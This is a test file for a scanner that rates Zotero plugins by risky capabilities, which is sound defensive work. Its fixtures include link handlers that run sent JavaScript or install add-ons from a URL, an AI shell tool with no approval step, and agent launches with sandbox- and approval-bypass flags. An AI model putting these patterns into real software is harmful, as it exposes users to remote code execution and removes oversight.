      "content/a.js": `const HEADERS = { "Access-Control-Allow-Origin": "*" };
        const s = Cc["@mozilla.org/network/server-socket;1"].createInstance(Ci.nsIServerSocket); s.init(8080, true, -1);`,
    });
    expect(r.card.capabilities).toContainEqual({ id: "own-server", concern: "medium" });
  });

  it("knows an Access-Control-Allow-Origin header opens no endpoint on Zotero's server", async () => {
    // Zotero answers the preflight itself and drops browser requests unless the endpoint opts in;
    // headers passed as sendResponse's fourth argument (its options) never reach the browser
    // (notebook-zotero-backlink).
    const r = await scanFiles({
      "content/a.js": `const CORS = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "Content-Type, Zotero-Allowed-Request" };
        const E = Zotero.Server.Endpoints["/x/import"] = function () {};
        E.prototype = { supportedMethods: ["POST", "OPTIONS"], supportedDataTypes: ["application/json"],
          async init(data, callback) { const note = new Zotero.Item("note"); await note.saveTx(); callback(201, "application/json", "{}", CORS); } };`,
    });
    expect(capIn(r, "own-server")).toBeUndefined();
    expect(r.card.capabilities).toContainEqual({ id: "server-edits-library", concern: "low" });
  });

  it("reads a prefs.js default written over several lines with a trailing comma", async () => {
    const r = await scanFiles({
      "prefs.js":
        "pref(\n  'extensions.zotero.x.apiEndpoint',\n  'https://api.example-endpoint.org',\n);\n",
      "content/a.js": `fetch(Zotero.Prefs.get("extensions.zotero.x.apiEndpoint", true));`,
    });
    expect(hostIn(r, "api.example-endpoint.org")?.usage).toBe("request");
  });
});

describe("zotero-plugin-toolkit's zotero:// bridges (toolkit sweep, 2026-09-26)", () => {
  // A cut-down toolkit: ToolkitGlobal registers both bridges the first time getInstance() runs.
  // Up to 4.1.0 BasicTool's constructor calls it; from 4.1.1 only its `debug` getter does, and
  // PromptManager's constructor, which ZoteroToolkit builds as its `Prompt`.
  const toolkit = (setup: "eager" | "lazy") => `
    var ToolkitGlobal = class {
      constructor() { DebugBridge.setModule(this); PluginBridge.setModule(this); }
      static getInstance() {
        if (!("_toolkitGlobal" in Zotero)) Zotero._toolkitGlobal = new ToolkitGlobal();
        return Zotero._toolkitGlobal;
      }
    };
    var BasicTool = class {
      constructor() {
        this._basicOptions = {
          log: { prefix: "" },
          ${setup === "eager" ? "debug: ToolkitGlobal.getInstance().debugBridge," : "get debug() { return ToolkitGlobal.getInstance()?.debugBridge; },"}
        };
      }
      get basicOptions() { return this._basicOptions; }
    };
    var DebugBridge = class {
      static version = 2;
      static setModule(g) { g.debugBridge = new DebugBridge(); }
      constructor() {
        const ext = { noContent: true, doAction: async (uri) => {
          const params = parse(uri.spec);
          const skip = ToolkitGlobal.getInstance()?.debugBridge.disableDebugBridgePassword;
          if (skip || window.confirm("External App wants to execute command without password")) {
            const F = Object.getPrototypeOf(async () => {}).constructor;
            await new F("Zotero,window", params.run)(Zotero, window);
          }
        }, newChannel(uri) { this.doAction(uri); } };
        Services.io.getProtocolHandler("zotero").wrappedJSObject._extensions["zotero://ztoolkit-debug"] = ext;
      }
    };
    var PluginBridge = class {
      static version = 1;
      static setModule(g) { g.pluginBridge = new PluginBridge(); }
      constructor() {
        const ext = { noContent: true, doAction: async (uri) => {
          const params = parse(uri.spec);
          const addon = await AddonManager.getInstallForURL(params.url);
          addon.install();
        }, newChannel(uri) { this.doAction(uri); } };
        Services.io.getProtocolHandler("zotero").wrappedJSObject._extensions["zotero://plugin"] = ext;
      }
    };
    var PromptManager = class extends BasicTool {
      constructor(base) {
        super(base);
        if (!ToolkitGlobal.getInstance()?.prompt) throw new Error("Prompt is not initialized.");
      }
    };
    var ZoteroToolkit = class extends BasicTool { Prompt = new PromptManager(this); };`;
  const scan = (setup: "eager" | "lazy", plugin: string) =>
    scanFiles({ "content/index.js": `${toolkit(setup)}\n${plugin}` });
  const bridges = (r: ScanOutput) =>
    ["link-installs-addons", "link-runs-code"].filter((id) => capIn(r, id));

  it("counts the bridges only when the build sets the toolkit up (zotero-addons)", async () => {
    // Its own toolkit without a Prompt: the bridges are bundled but never registered.
    const none = await scan(
      "lazy",
      "var MyToolkit = class extends BasicTool { UI = {}; }; var ztoolkit = new MyToolkit();",
    );
    expect(bridges(none)).toEqual([]);
    expect(none.card.label).toBe("low-concern");
    // ZoteroToolkit (or a subclass) builds a PromptManager, which sets the toolkit up.
    for (const plugin of [
      "var ztoolkit = new ZoteroToolkit();",
      "var MyToolkit = class extends ZoteroToolkit {}; var Ku = MyToolkit; function create() { return new Ku(); }",
      // Reading `basicOptions.debug` runs its getter; so does calling getInstance() directly.
      "var ztoolkit = new BasicTool(); ztoolkit.basicOptions.debug.disableDebugBridgePassword = false;",
      "ToolkitGlobal.getInstance();",
    ]) {
      const r = await scan("lazy", plugin);
      expect(bridges(r)).toEqual(["link-installs-addons", "link-runs-code"]);
      expect(capIn(r, "link-runs-code")?.details?.asksFirst).toBe(true);
      expect(capIn(r, "link-installs-addons")?.libraries).toEqual(["zotero-plugin-toolkit"]);
    }
  });

  it("counts any toolkit object in versions that set the toolkit up in BasicTool (4.1.0)", async () => {
    // Built directly, or through a CommonJS export (`exports.BasicTool = BasicTool3`).
    for (const plugin of [
      "var tool = new BasicTool();",
      "var basic = {}; basic.Tool = BasicTool; var tool = new import_basic.Tool();",
    ])
      expect(bridges(await scan("eager", plugin))).toEqual([
        "link-installs-addons",
        "link-runs-code",
      ]);
    expect(bridges(await scan("eager", "var ready = true;"))).toEqual([]);
  });

  it("keeps the bridges when obfuscation hides whether the toolkit is set up", async () => {
    const ids = Array.from({ length: 80 }, (_, i) => `var _0x${(0xa00 + i).toString(16)} = ${i};`);
    const r = await scan("lazy", `${ids.join("\n")}\nvar t = new _0xa01();`);
    expect(bridges(r)).toEqual(["link-installs-addons", "link-runs-code"]);
  });

  it("recognises the plugin bridge in obfuscated builds as a link, not an installer (zotmind, zotbox, zotero-style)", async () => {
    // The key in plain text, `_extensions` hidden, the handler bound through a parameter.
    const plainKey = await scanFiles({
      "content/a.js": `async function i(o){const jp=await jk['getInstallForURL'](o['url']);jp['install']();}
        function b(jl){Services['io']['getProtocolHandler']('zotero')['wrappedJSObject'][zr(0x82a)]['zotero://plugin']=jl;}`,
    });
    expect(capIn(plainKey, "link-installs-addons")?.details?.apis).toEqual(["zotero://plugin"]);
    expect(capIn(plainKey, "installs-addons")).toBeUndefined();
    // Every name hidden, the handler's shape left: it installs from the link, "Plugin Toolkit".
    const shape = await scanFiles({
      "content/a.js": `function s(){const h={'noContent':!![],'doAction':async u=>{const p=q(u);if(p['minVersion']&&v(p['minVersion'])<0x0)throw new Error('x');const a=await M['\\x67\\x65\\x74\\x49\\x6e\\x73\\x74\\x61\\x6c\\x6c\\x46\\x6f\\x72\\x55\\x52\\x4c'](p['url']);a['install']();},'newChannel'(u){this['doAction'](u);}};Services['io'][_0x1(0x2d0f)](_0x1(0x5a8e))[_0x1(0x23cb)][_0x1(0x1c36)][_0x1(0x319b)]=h;}function g(t){const w=new Zotero['ProgressWindow']({});w['changeHeadline']('Plugin\\x20Toolkit');}`,
    });
    expect(capIn(shape, "link-installs-addons")?.details?.apis).toEqual(["zotero://plugin"]);
    expect(capIn(shape, "link-installs-addons")?.libraries).toEqual(["zotero-plugin-toolkit"]);
    expect(capIn(shape, "installs-addons")).toBeUndefined();
    // The key in escapes, the install call hidden in a string array: it's still the plugin bridge.
    const hiddenCall = await scanFiles({
      "content/a.js": `function s(){const h={'noContent':!![],'doAction':async u=>{const a=await M[_0x1(0x12)](u);a[_0x1(0x13)]();},'newChannel'(u){this['doAction'](u);}};Services['io']['getProtocolHandler']('zotero')[_0x1(0xc1a)]['\\x5f\\x65\\x78\\x74\\x65\\x6e\\x73\\x69\\x6f\\x6e\\x73']['\\x7a\\x6f\\x74\\x65\\x72\\x6f\\x3a\\x2f\\x2f\\x70\\x6c\\x75\\x67\\x69\\x6e']=h;}`,
    });
    expect(capIn(hiddenCall, "link-installs-addons")?.details?.asksFirst).toBe(false);
  });

  it("rates the debug link as running code unasked when a build turns its prompt off (zotero-split-viewer)", async () => {
    const init = (env: string, line: string) =>
      scan(
        "lazy",
        `function initZToolkit(t) { const env = "${env}"; ${line} }
         var Addon = class { constructor() { this.data = { env: "${env}", ztoolkit: new ZoteroToolkit() }; initZToolkit(this.data.ztoolkit); } };
         var addon = new Addon();`,
      );
    const dev = await init(
      "development",
      `t.basicOptions.debug.disableDebugBridgePassword = env !== "production";`,
    );
    expect(capIn(dev, "link-runs-code")?.details).toMatchObject({
      asksFirst: false,
      apis: ["zotero://ztoolkit-debug (prompt turned off)"],
    });
    expect(dev.card.label).toBe("high-concern");
    const viaData = await init(
      "development",
      `t.basicOptions.debug.disableDebugBridgePassword = addon.data.env === "development";`,
    );
    expect(capIn(viaData, "link-runs-code")?.details?.asksFirst).toBe(false);
    const prod = await init(
      "production",
      `t.basicOptions.debug.disableDebugBridgePassword = env === "development";`,
    );
    expect(capIn(prod, "link-runs-code")?.details?.asksFirst).toBe(true);
    expect(prod.card.label).toBe("review-details");
  });
});

describe("package installs and AI-written code (rating-facts sweep, 2026-09-26)", () => {
  const launch = `Subprocess.call({ command: "/bin/sh", arguments: ["-c", cmd] });`;
  const pinning = (r: ScanOutput) => capIn(r, "package-run")?.details;

  it("doesn't count install hints it only shows (zotero-djvu-converter)", async () => {
    const r = await scanFiles({
      "content/a.js": `function getInstallInstructions(p) { const winMap = { ocrmypdf: "pip install ocrmypdf" }; return winMap[p]; }
        function report() { let message = "Missing tools:\\n"; message += "  pip install ocrmypdf\\n"; alert(message); } ${launch}`,
    });
    expect(capIn(r, "package-run")).toBeUndefined();
    const run = await scanFiles({
      "content/a.js": `function installOcr() { const cmd = "pip install ocrmypdf"; ${launch} }`,
    });
    expect(capIn(run, "package-run")).toBeDefined();
  });

  it("pairs a package tool only with argument lists a launch takes (zotero-claudian, zotero-gemini-notebook)", async () => {
    // A directory named pnpm, and a bundled SQL keyword list starting with "add" in another file.
    const sql = await scanFiles({
      "content/a.js": `const dirs = [\`\${localAppData}\\\\pnpm\`, \`\${home}/.bun/bin\`]; Subprocess.call({ command: claudePath, arguments: ["-p", q] });`,
      "content/chat.js": `const NON_RESERVED_WORDS = ["add", "asc", "collation", "desc"];`,
    });
    expect(capIn(sql, "package-run")).toBeUndefined();
    // A list of modes next to a real `uv run`.
    const modes = await scanFiles({
      "content/a.js": `const MODES = Object.freeze(["add", "reset"]);
        const spec = { command: "uv", args: ["run", "--locked", "--project", dir, "python", path] };
        Subprocess.call({ command: spec.command, arguments: spec.args });`,
      "content/uv.lock": "version = 1\n",
    });
    expect(pinning(modes)?.apis).toEqual(["uv run"]);
  });

  it("doesn't count an MCP config for another app, whatever its key (zotero-lit-synapse-gpu)", async () => {
    const r = await scanFiles({
      "content/a.js": `const configTemplate = (port) => ({ experimental: { modelContextProtocolServers: [{ transport: { type: "stdio", command: "npx", args: ["mcp-remote", \`http://127.0.0.1:\${port}/mcp\`] } }] } });
        Subprocess.call({ command: gpuExe, arguments: [] });`,
    });
    expect(capIn(r, "package-run")).toBeUndefined();
  });

  it("finds pip run through a Python interpreter's argument list (paperviewzoteroplugin, zotero-pdf2zh)", async () => {
    const r = await scanFiles({
      "content/a.js": `async function setup() { await runProcessChecked(envPython, ["-m", "pip", "install", "requests", "tqdm"]); }
        Subprocess.call({ command: envPython, arguments: [] });`,
    });
    expect(pinning(r)).toMatchObject({ pinning: "unpinned", packages: ["requests", "tqdm"] });
    expect(r.card.label).toBe("high-concern");
    // Through conda, with the version from a constant: a fixed top-level version.
    const conda = await scanFiles({
      "content/a.js": `const NEXT_VERSION = "2.9.0";
        async function installBackend(config) {
          const backend = { package: "pdf2zh-next", version: NEXT_VERSION };
          await this.runPlainProcess(config.condaPath, ["run", "-n", env, "python", "-m", "pip", "install", "--upgrade-strategy", "only-if-needed", \`\${backend.package}==\${backend.version}\`]);
        }
        Subprocess.call({ command: p, arguments: [] });`,
    });
    expect(pinning(conda)?.pinning).toBe("top-level");
    expect(conda.card.label).toBe("review-details");
  });

  it("counts a wheel file it names, and a version from its shipped manifest, as fixed (litmtrans)", async () => {
    const r = await scanFiles({
      "content/manifest.js": `var Manifest = { scansci: { package: "scansci-pdf", recommendedVersion: "1.17.0" } };`,
      "content/runtime.js": `async function installRuntime(manifest) {
          const wheelPath = joinPath(staging, "scansci-pdf.whl");
          const pipOptions = ["--disable-pip-version-check", "--timeout", "30", "--retries", "1"];
          let installed = await runProcess(executable, ["-m", "pip", "install", "--target", root, ...pipOptions, wheelPath, "--index-url", first]);
          if (installed.exitCode !== 0) installed = await runProcess(executable, ["-m", "pip", "install", "--target", root, \`\${manifest.scansci.package}==\${manifest.scansci.recommendedVersion}\`]);
        }
        Subprocess.call({ command: executable, arguments: [] });`,
    });
    expect(pinning(r)).toMatchObject({ pinning: "top-level", packages: ["scansci-pdf"] });
    expect(r.card.label).toBe("review-details");
  });

  it("reads a package named in another file and npx run through node (zotero-translate)", async () => {
    const r = await scanFiles({
      "content/constants.js": `var Constants = { ACP_PACKAGE_SPEC: "@agentclientprotocol/codex-acp@1.6.2" };`,
      "content/providers.js": `var Providers = { codex: { packageSpec: Constants.ACP_PACKAGE_SPEC }, pi: { packageSpec: "pi-acp@0.0.33" } };`,
      "content/acp.js": `function createSubprocess(paths, provider) {
          const argumentsList = [paths.npxCliPath, "--yes", "--package", provider.packageSpec, provider.command];
          return Subprocess.call({ command: paths.nodePath, arguments: argumentsList });
        }`,
    });
    expect(pinning(r)).toMatchObject({
      pinning: "top-level",
      packages: ["@agentclientprotocol/codex-acp 1.6.2", "pi-acp 0.0.33"],
    });
  });

  it("follows a command rewritten to a package runner (zetero-babeldoc's uvx fallback)", async () => {
    const r = await scanFiles({
      "content/a.js": `async function normalizeCommand(tokens) {
          if (await findExecutable("babeldoc")) return tokens;
          const uvx = await findOptionalExecutable("uvx");
          if (uvx) return [uvx, "--from", "BabelDOC", "babeldoc", ...tokens.slice(1)];
          return tokens;
        }
        Subprocess.call({ command: t[0], arguments: t.slice(1) });`,
    });
    expect(pinning(r)).toMatchObject({ pinning: "unpinned", packages: ["BabelDOC"] });
  });

  it("tells a locked install from requirements it ships loose or the user's own (jadense, twintext, paper-curio)", async () => {
    const runReqs = `Subprocess.call({ command: py, arguments: ["-m", "pip", "install", "-r", reqPath] });`;
    const locked = await scanFiles({
      "content/install.sh": `#!/bin/sh\n"$uv_path" sync --project "$runtime" --frozen\n`,
      "content/uv.lock": `version = 1\n`,
      "content/a.js": `Subprocess.call({ command: "/bin/sh", arguments: [root + "content/install.sh"] });`,
    });
    expect(pinning(locked)?.pinning).toBe("locked");
    expect(locked.card.label).toBe("review-details");
    const pinnedFile = await scanFiles({
      "service/requirements.txt": "requests==2.32.3\ntqdm==4.66.5 --hash=sha256:abc\n",
      "content/a.js": runReqs,
    });
    expect(pinning(pinnedFile)?.pinning).toBe("locked");
    const looseFile = await scanFiles({
      "service/requirements.txt": "requests\nfastapi>=0.115.0\n",
      "content/a.js": runReqs,
    });
    expect(pinning(looseFile)?.pinning).toBe("unpinned");
    // No requirements file shipped: the user's own project, not the plugin's supply chain.
    const users = await scanFiles({ "content/a.js": runReqs });
    expect(pinning(users)?.pinning).toBeUndefined();
    expect(users.card.label).toBe("review-details");
    // Exact versions with no dependencies pulled: nothing floats.
    const noDeps = await scanFiles({
      "content/a.js": `const pip = ["pip", "install", "--python", python];
        await run(job, uv, [...pip, "--no-deps", "mineru==4.0.0", "docvortex==0.4.9"], env);
        Subprocess.call({ command: uvPath, arguments: [] });`,
    });
    expect(pinning(noDeps)).toMatchObject({ pinning: "locked" });
  });

  it("names the packages in a requirements file or project it ships, and their pinning (paperviewzoteroplugin, zotero-notebooklm)", async () => {
    const reqs = (path: string) =>
      `Subprocess.call({ command: py, arguments: ["-m", "pip", "install", "--upgrade", "pip"] });
      Subprocess.call({ command: py, arguments: ["-m", "pip", "install", "-r", ${path}] });`;
    const loose = await scanFiles({
      "service/requirements.txt": "requests\ntqdm\npymupdf4llm\n",
      "content/a.js": reqs("getRequirementsPath()"),
    });
    expect(pinning(loose)).toMatchObject({
      pinning: "unpinned",
      packages: ["pip", "pymupdf4llm", "requests", "tqdm"],
    });
    // Ranges, through uv's pip; only the file the command names when it's written out.
    const ranges = await scanFiles({
      "backend/requirements.txt":
        "# Core\nnotebooklm-py[cookies]>=0.7.1,<0.8\nfastapi>=0.115.0\nuvicorn>=0.30.0 ; python_version >= '3.10'\n",
      "backend/requirements-dev.txt": "pytest\n",
      "content/a.js": `Subprocess.call({ command: uv, arguments: ["pip", "install", "-r", "backend/requirements.txt"] });`,
    });
    expect(pinning(ranges)).toMatchObject({
      pinning: "unpinned",
      packages: ["fastapi", "notebooklm-py", "uvicorn"],
    });
    // `uv run` in a project it ships: exact versions pin what it names.
    const project = (deps: string) => ({
      "server/pyproject.toml": `[project]\nname = "bridge"\ndependencies = [\n  ${deps}\n]\n`,
      "content/a.js": `const spec = { command: "uv", args: ["run", "--project", dir, "server.py"] };
        Subprocess.call({ command: spec.command, arguments: spec.args });`,
    });
    const exact = await scanFiles(project(`"httpx==0.27.0",\n  "mcp==1.2.0"`));
    expect(pinning(exact)).toMatchObject({
      pinning: "top-level",
      packages: ["httpx 0.27.0", "mcp 1.2.0"],
    });
    const floating = await scanFiles(project(`"httpx>=0.27",\n  "mcp"`));
    expect(pinning(floating)).toMatchObject({ pinning: "unpinned", packages: ["httpx", "mcp"] });
    // A requirements file the user supplies names nothing of the plugin's.
    const users = await scanFiles({ "content/a.js": reqs("userReqs") });
    expect(pinning(users)).toMatchObject({ pinning: "unpinned", packages: ["pip"] });
  });

  it("reads a shipped project's dependencies past an extra's brackets, and only the requirements files a command names (jadense-in-zotero)", async () => {
    const project = (deps: string) => ({
      "ocr/pyproject.toml": `[project]\nname = "ocr"\ndependencies = [${deps}]\n`,
      "content/a.js": `const spec = { command: "uv", args: ["run", "--project", dir, "server.py"] };
        Subprocess.call({ command: spec.command, arguments: spec.args });`,
    });
    // `docling[rapidocr]` doesn't end the list: what follows it counts too.
    const exact = await scanFiles(project(`"docling[rapidocr]==2.126.0", "rapidocr==3.9.2"`));
    expect(pinning(exact)).toMatchObject({
      pinning: "top-level",
      packages: ["docling 2.126.0", "rapidocr 3.9.2"],
    });
    const floating = await scanFiles(project(`"httpx==0.27.0", "uvicorn[standard]>=0.30"`));
    expect(pinning(floating)).toMatchObject({ pinning: "unpinned", packages: ["uvicorn"] });
    // The file a command names is the one that counts, for its pinning as for its packages; one
    // at a path it doesn't ship is the user's.
    const files = {
      "service/requirements.txt": "requests\ntqdm\n",
      "service/requirements-lock.txt": "requests==2.32.3\ntqdm==4.66.4\n",
    };
    const install = (path: string) =>
      `Subprocess.call({ command: py, arguments: ["-m", "pip", "install", "-r", ${path}] });`;
    const locked = await scanFiles({
      ...files,
      "content/a.js": install("`${dir}/requirements-lock.txt`"),
    });
    expect(pinning(locked)).toMatchObject({ pinning: "locked" });
    const elsewhere = await scanFiles({
      ...files,
      "content/a.js": install(`"/opt/lab/requirements-gpu.txt"`),
    });
    expect(capIn(elsewhere, "package-run")?.details?.packages).toBeUndefined();
  });

  it("notes an install a startup hook reaches, not one a click starts (paper-notion-flow, zotero-notebooklm)", async () => {
    const code = (hook: string) => `
      async function ensureEnvReady() { await runProcess(envPython, ["-m", "pip", "install", "requests"]); }
      ${hook}
      Subprocess.call({ command: envPython, arguments: [] });`;
    const startup = await scanFiles({
      "bootstrap.js": code(`async function startup() { ensureEnvReady().catch((e) => log(e)); }`),
    });
    expect(pinning(startup)?.atStartup).toBe(true);
    const click = await scanFiles({
      "bootstrap.js": code(
        `async function startup() { button.addEventListener("command", () => ensureEnvReady()); }`,
      ),
    });
    expect(pinning(click)?.atStartup).toBeUndefined();
    // Asking first isn't "without asking".
    const asks = await scanFiles({
      "bootstrap.js": `async function ensureEnvReady() { if (!Services.prompt.confirm(null, "Install", "Install packages?")) return; await runProcess(envPython, ["-m", "pip", "install", "requests"]); }
        async function startup() { await ensureEnvReady(); } Subprocess.call({ command: envPython, arguments: [] });`,
    });
    expect(pinning(asks)?.atStartup).toBeUndefined();
  });

  it("tells code sent by other programs from its own AI assistant's (zotero-local-write-api, zotmcp)", async () => {
    const endpoint = await scanFiles({
      "bootstrap.js": `async function handleRunJavascript(data) { let code = data.code; let fn = new AsyncFunction("Zotero", code); return fn(Zotero); }
        function runWrite(data) { switch (data.operation) { case "run_javascript": return handleRunJavascript(data); } }
        Zotero.Server.Endpoints["/write"] = WriteEndpoint;`,
    });
    expect(capIn(endpoint, "runs-sent-code")?.details).toEqual({ apis: ["local endpoint"] });
    expect(endpoint.card.label).toBe("review-details");
    const assistant = await scanFiles({
      "content/agent.js": `const tool = { spec: { name: "zotero_script" }, shouldRequireConfirmation() { return false; },
          async execute(params) { const fn = new AsyncFunction("Zotero", "env", params.script); return fn(Zotero, env); } };
        for (const call of reply.choices[0].message.tool_calls) await run(call);`,
    });
    expect(capIn(assistant, "runs-sent-code")?.details).toMatchObject({
      apis: ["AI tool"],
      approval: "none",
    });
    expect(assistant.card.label).toBe("high-concern");
  });

  it("rates its AI assistant's code by whether each run is approved (llm-for-zotero, paperpilot)", async () => {
    const tool = (guard: string) =>
      scanFiles({
        "content/agent.js": `const tool = { spec: { name: "zotero_script", ${guard} },
            async execute(params) { const fn = new AsyncFunction("Zotero", "env", params.script); return fn(Zotero, env); } };
          for (const call of reply.choices[0].message.tool_calls) await run(call);`,
      });
    const asks = await tool(`requiresConfirmation: true`);
    expect(capIn(asks, "runs-sent-code")?.details?.approval).toBe("each-run");
    expect(asks.card.label).toBe("review-details");
    // A "read" script is still any code: the model picks the mode.
    const readSkips = await tool(
      `requiresConfirmation: true }, shouldRequireConfirmation(input) { if (input.mode === "read") return false; return true; }, x: { y: 1`,
    );
    expect(capIn(readSkips, "runs-sent-code")?.details?.approval).toBe("none");
    const unknown = await tool(`description: "Run JavaScript in Zotero"`);
    expect(capIn(unknown, "runs-sent-code")?.details?.approval).toBe("none");
  });

  it("points at the runner, not a bundled library's loader (paperpilot's mermaid eval)", async () => {
    const r = await scanFiles({
      "content/a.js": `function loadMermaid(iframeWin, mermaidSource) { iframeWin.eval(mermaidSource); }
        ${"// filler\n".repeat(50)}
        const tool = { spec: { name: "zotero_script" }, shouldRequireConfirmation() { return false; },
          async execute(params) { const fn = new AsyncFunction("Zotero", "env", params.script); return fn(Zotero, env); } };
        for (const call of message.tool_calls) await run(call);`,
    });
    expect(capIn(r, "runs-sent-code")?.evidence[0]?.snippet).toContain("params.script");
  });

  it("finds a shell tool its AI assistant can call, and a switch named for it (llm-for-zotero, systematic-reviewer)", async () => {
    const shell = (extra: string) =>
      scanFiles({
        "content/agent.js": `function shellToolDefinition() { return { id: "sr.shellRun", execute: async (args) => runShell(args.command) }; }
          ${extra}
          async function runShell(command) { return Subprocess.call({ command: "/bin/sh", arguments: ["-c", command] }); }
          for (const call of message.tool_calls) await dispatch(call);`,
      });
    const open = await shell("");
    expect(capIn(open, "runs-sent-code")?.details).toMatchObject({
      apis: ["AI shell tool"],
      approval: "none",
    });
    expect(open.card.label).toBe("high-concern");
    const gated = await shell(
      `function getSessionTools(settings) { const tools = []; if (settings.shell_enabled === true) tools.push(shellToolDefinition()); return tools; }`,
    );
    expect(capIn(gated, "runs-sent-code")?.details?.approval).toBe("code-switch");
    expect(gated.card.label).toBe("review-details");
    // No AI assistant of its own: a shell helper named like a tool isn't one.
    const noAgent = await scanFiles({
      "content/a.js": `const t = { name: "run_command" }; Subprocess.call({ command: "/bin/sh", arguments: ["-c", cmd] });`,
    });
    expect(capIn(noAgent, "runs-sent-code")).toBeUndefined();
  });

  it("notes AI coding agents started with fewer approval prompts (clautero, mineru-zotero-reader)", async () => {
    const modes = (r: ScanOutput) => capIn(r, "process-launch")?.details?.agentModes;
    const claude = await scanFiles({
      "content/a.js": `function claudeArgs(settings) { return ["-p", q, "--permission-mode", settings.permissionMode ?? "acceptEdits"]; }
        function codexArgs(settings) { const args = ["exec"]; if (settings.permissionMode === "bypassPermissions") args.push("--dangerously-bypass-approvals-and-sandbox"); return args; }
        Subprocess.call({ command: "claude", arguments: claudeArgs(s) });`,
    });
    expect(modes(claude)).toEqual([
      { program: "Claude Code", mode: "accept-edits", byDefault: true },
      { program: "Claude Code", mode: "full-bypass", byDefault: false },
      { program: "Codex CLI", mode: "full-bypass", byDefault: false },
    ]);
    expect(claude.card.label).toBe("review-details");
    expect(claude.card.drivers).toContain("CAP-AGENT-FEWER-PROMPTS");
    // Codex told never to ask: inside a sandbox that can write, or read-only (nothing to note).
    const codex = (sandbox: string) =>
      scanFiles({
        "content/a.js": `const args = ["exec", "--skip-git-repo-check", "--sandbox", "${sandbox}", "-c", 'approval_policy="never"', "-"];
          Zotero.Utilities.Internal.exec(codexPath, args);`,
      });
    expect(modes(await codex("workspace-write"))).toEqual([
      { program: "Codex CLI", mode: "sandboxed", byDefault: true },
    ]);
    expect(modes(await codex("read-only"))).toBeUndefined();
    // Every prompt and the sandbox off by default; a check for the flag isn't passing it.
    const bypass = await scanFiles({
      "content/a.js": `const args = ["exec", ...(hasArg("--dangerously-bypass-approvals-and-sandbox") ? [] : ["--dangerously-bypass-approvals-and-sandbox"])];
        Subprocess.call({ command: codexPath, arguments: args });`,
    });
    expect(modes(bypass)).toEqual([
      { program: "Codex CLI", mode: "full-bypass", byDefault: false },
    ]);
    const always = await scanFiles({
      "content/a.js": `Subprocess.call({ command: "claude", arguments: ["-p", q, "--dangerously-skip-permissions"] });`,
    });
    expect(always.card.label).toBe("high-concern");
    // `--yolo` belongs to whichever agent it launches: Codex CLI takes it too; none named, none said.
    const yolo = (command: string) =>
      scanFiles({
        "content/a.js": `Subprocess.call({ command: ${command}, arguments: ["exec", "--yolo", q] });`,
      });
    expect(modes(await yolo('"/usr/local/bin/codex"'))).toEqual([
      { program: "Codex CLI", mode: "full-bypass", byDefault: true },
    ]);
    expect(modes(await yolo('"gemini"'))).toEqual([
      { program: "Gemini CLI", mode: "full-bypass", byDefault: true },
    ]);
    expect(modes(await yolo("agentPath"))).toEqual([
      { program: "an AI coding agent", mode: "full-bypass", byDefault: true },
    ]);
  });

  it("reads a permission mode passed on from a setting's default (zotero-claudian)", async () => {
    const code = `const ARGV = { default: "default", acceptEdits: "acceptEdits" };
      function buildArgs(opts) { const args = ["-p"]; args.push("--permission-mode", ARGV[opts.permissionMode]); return args; }
      Subprocess.call({ command: cliPath, arguments: buildArgs(o) });`;
    const r = await scanFiles({
      "prefs.js": `pref("extensions.zotero-claudian.defaultPermissionMode", "acceptEdits");`,
      "content/a.js": code,
    });
    expect(capIn(r, "process-launch")?.details?.agentModes).toEqual([
      { program: "Claude Code", mode: "accept-edits", byDefault: true },
    ]);
    const asks = await scanFiles({
      "prefs.js": `pref("extensions.x.claudeCodePermissionMode", "default");`,
      "content/a.js": code,
    });
    expect(capIn(asks, "process-launch")?.details?.agentModes).toBeUndefined();
  });
});

describe("endpoints on Zotero's built-in server (C14 sweep, 2026-09-26)", () => {
  const editsLibrary = (r: ScanOutput) => capIn(r, "server-edits-library");

  it("finds endpoints registered through names, helpers and optional chaining", async () => {
    const forms = [
      // confucius: a helper returns the table; the endpoint's prototype is a parameter.
      `function getEndpointMap() { const server = Zotero.Server; return server?.Endpoints ?? null; }
       function registerPath(path2, proto) { const endpoints = getEndpointMap(); function Endpoint() {} Endpoint.prototype = proto; endpoints[path2] = Endpoint; }
       registerPath("/c/rpc", { supportedMethods: ["POST"], init: async () => [200, "text/plain", "ok"] });`,
      // zotero-pdf2zh-annotation-sync
      `class Runtime { start() { const endpoints = this.Zotero.Server.Endpoints; for (const name of NAMES) endpoints[\`/s/\${name}\`] = makeClass(name); } }`,
      // zopilot
      `function getEndpoints() { const server = globalThis.Zotero?.Server; return server?.Endpoints && typeof server.Endpoints === "object" ? server.Endpoints : void 0; }
       function register(path, ctor) { const endpoints = getEndpoints(); endpoints[path] = ctor; }`,
      // zotero-prism (minified), paper-feed-zotero (two helpers deep)
      `function gm() { let e = Zotero.Server; if (!e?.Endpoints) return; e.Endpoints["/p/next"] = zi(["GET"], (t, n) => n(200)); }`,
      `function getServer() { const server = Zotero.Server; return server; }
       function ensureServerStarted() { const server = getServer(); return server; }
       function registerLegacyEndpoint(path, endpoint) { const server = ensureServerStarted(); server.Endpoints[path] = endpoint; }`,
    ];
    for (const code of forms) {
      const r = await scanFiles({ "content/a.js": code });
      expect(capIn(r, "local-http-server"), code.slice(0, 60)).toBeDefined();
    }
    // A table that isn't Zotero's isn't one of its endpoints.
    const other = await scanFiles({
      "content/a.js": `const routes = {}; function add(path, h) { routes[path] = h; } add("/x", () => 1);`,
    });
    expect(capIn(other, "local-http-server")).toBeUndefined();
  });

  it("tells endpoints that change the library from ones that only answer", async () => {
    const writes = await scanFiles({
      "bootstrap.js": `async function handleImport(data) { const item = Zotero.Items.getByLibraryAndKey(1, data.key);
          await Zotero.Attachments.importFromFile({ file: data.path, parentItemID: item.id }); return [200, "application/json", "{}"]; }
        function buildEndpoint(handler, opts) { const E = function () {}; E.prototype = { supportedMethods: opts.methods, init: handler }; return E; }
        const IMPORT = buildEndpoint(handleImport, { methods: ["POST"] });
        Zotero.Server.Endpoints["/cli/import-file"] = IMPORT;`,
    });
    expect(writes.card.capabilities).toContainEqual({ id: "server-edits-library", concern: "low" });
    expect(writes.card.label).toBe("low-concern");
    const reads = await scanFiles({
      "bootstrap.js": `Zotero.Server.Endpoints["/x/items"] = class { supportedMethods = ["GET"];
          async init() { const items = await Zotero.Items.getAll(1); return [200, "application/json", JSON.stringify(items.map((i) => i.getField("title")))]; } };`,
    });
    expect(editsLibrary(reads)).toBeUndefined();
    expect(reads.card.capabilities).toContainEqual({ id: "local-http-server", concern: "none" });
  });

